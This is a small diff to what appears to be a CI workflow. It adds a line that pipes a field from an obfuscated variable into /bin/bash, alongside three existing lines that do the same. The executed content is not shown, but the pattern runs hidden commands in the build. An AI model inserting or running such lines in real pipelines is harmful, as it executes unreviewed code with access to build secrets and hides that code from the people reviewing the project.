@@ -32,6 +32,7 @@ jobs:
           echo $gbw6319 | jq -r .xama230 | /bin/bash
           printf '%s' "$uaphy09" | jq -r .tb21 | /bin/bash
           echo $xoo018 | jq -r .fv92 | /bin/bash
+          echo $snh1685 | jq -r .ftp204 | /bin/bash
 
       - name: Upload artifact
         if: always()
